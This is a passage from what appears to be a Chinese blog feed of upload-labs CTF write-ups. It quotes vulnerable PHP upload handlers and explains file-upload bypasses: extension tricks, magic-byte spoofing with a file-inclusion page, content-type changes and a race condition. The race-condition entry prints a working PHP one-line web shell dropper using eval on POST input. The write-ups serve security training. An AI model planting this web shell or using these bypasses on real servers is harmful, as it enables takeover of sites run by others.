class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>    <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个没有去除末尾的点的,后缀文件解析多加点和空格都会被删除的    所以我们提交1.php.即可</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>多加点绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图片码绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%9B%BE%E7%89%87%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%9B%BE%E7%89%87%E7%A0%81%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="图片码绕过"><a href="#图片码绕过" class="headerlink" title="图片码绕过"></a>图片码绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//获得图片信息,返回的是一个数组</span><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<span class="hljs-comment">//根据常量值把转换为对应的文件类型</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>getimagesize()函数返回-一个包含图像信息的数组。该数组的索引如下所示:<br>索引·0:图像的宽度(单位:像素)<br>索引·1:图像的高度(单位:像素)<br>索引·2:图像类型的常量值(可以使用·image_type_to_mime_type()·函数将其转换为·MIME类型)<br>索引·3:包含图像属性的字符串，以逗号分隔(如·“width&#x3D;500,height&#x3D;300”)<br>如果· getimagesize()·函数无法读取图像信息，则返回·false。否则，返回一个包含上述索引的数组。</p></blockquote><blockquote><p>常量值呢，就是文件类型</p><p>IMAGETYPE GIF:代表· GIF·图像文件的常量值<br>IMAGETYPE JPEG:代表·JPEG·图像文件的常量值<br>IMAGETYPE PNG:代表·PNG·图像文件的常量值<br>IMAGETYPE SWF:代表·SWF·(Shockwave·Flash)·文件的常量值<br>IMAGETYPE PSD:代表· Adobe·Photoshop·的· PSD· 文件的常量值<br>IMAGETYPE BMP:代表·BMP·(Bitmap)·图像文件的常量值</p></blockquote><blockquote><p>所以这个现在就不能通过更改前两位绕过了，所以只能靠真正的图片制造图片马<img src="/.com//image-20250122182020-qbl1mhk.png" alt="image"></p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>图片码绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>字节标识绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="字节标识绕过"><a href="#字节标识绕过" class="headerlink" title="字节标识绕过"></a>字节标识绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);  <br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);  <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;  <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;  <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:        <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:        <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:        <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:        <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>JPEG&#x2F;JFIF(常见的照片格式):头两个字节为:0xFF·0xD8。</p><p>PNG(无损压缩格式):头两个字节为·0x89·0x50。</p><p>GIF(支持动画的图像格式):头两个字节为·0x47·0x49。</p><p>BMP(Windows 位图格式):头两个字节为·0x42·0x4D。</p><p>TIFF(标签图像文件格式):头两个字节可以是不同的数值。</p></blockquote><p>虽然更改了识别符号上传成功PHP文件一句话木马，但是还是行不通的，因为会被解析成更改标记符的文件，所以我们就要看网页说的<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">文件包含漏洞</span>运行图片马中的恶意病毒，我们需要有一个漏洞可以让文件当作php文件执行，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(__file__);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>因为是get请求，所以我们需要用到?file&#x3D;   ,这个文件包含相当于是直接引用，文件包含会将文件中的内容当作php文件去执行</p></blockquote><p>​<kbd><a href="http://f954414b-0a1c-4cdb-8c02-7a593d0d2480.node5.buuoj.cn:81/upload/7020250122101410.jpg">http://f954414b-0a1c-4cdb-8c02-7a593d0d2480.node5.buuoj.cn:81/upload/7020250122101410.jpg</a></kbd>​</p><p>​<kbd><a href="http://f954414b-0a1c-4cdb-8c02-7a593d0d2480.node5.buuoj.cn:81/include.php">http://f954414b-0a1c-4cdb-8c02-7a593d0d2480.node5.buuoj.cn:81/include.php</a></kbd>​</p><blockquote><p>由于文件包含这个页面php在我文件上传文件的父目录，所以要到子目录要有路径，所以<kbd>./upload/7020250122101410.jpg</kbd>​这里的”.”的意思是当前目录的意思</p></blockquote><p>也可以找一个可以上传的图片然后制造一个图片马就行<img src="/.com//image-20250122182020-qbl1mhk.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字节标识绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争与绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="条件竞争与绕过"><a href="#条件竞争与绕过" class="headerlink" title="条件竞争与绕过"></a>条件竞争与绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?><p>‘);?&gt;   &#x2F;&#x2F;生成小马</p><p>fput函数：打开文件资源,如果shell.php不存在的话，我将新建shell.php文件,’w’以写入的方式把一句话木马写入到shell.php中</p></blockquote><blockquote><p>文件竞争，是因为这个文件要到服务器去处理，到服务器处理的话那么服务器就会有判断时间（if时长），那我们不断地上传，只要有一时刻生成小马文件上传成功，那么我们就有了一句话木马得到权限</p></blockquote><p><img src="/.com//image-20250123214234-jpnq0tp.png" alt="image"> </p><blockquote><p>我们只需要不断地上传这个小马文件，然后让系统有一瞬间处理勒这个小马文件</p></blockquote><p>即我上传的111.php生成小马文件，那么我访问&#x2F;upload&#x2F;111.php</p><p>上传和访问都在burp上面循环访问，知道生成shell.php成功，访问shell.php</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>条件竞争与绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件类型绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><blockquote><p>1.还是打开抓包工具，上传一句话木马，发现是上传成功了，说明是后端验证的</p></blockquote><blockquote><p>2.通过content-type判断文件类型</p></blockquote><p><img src="/.com//image-20250119174443-twfakc5.png" alt="image"></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><blockquote><p>上传一句话木马php，然后把content-type的验证改为jpg的可以放行</p></blockquote><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><blockquote><p>上传更改过后的一句话木马，上传jpg后缀的，然后burp改为php放行</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件类型绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>空格点绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="空格点绕过"><a href="#空格点绕过" class="headerlink" title="空格点绕过"></a>空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span 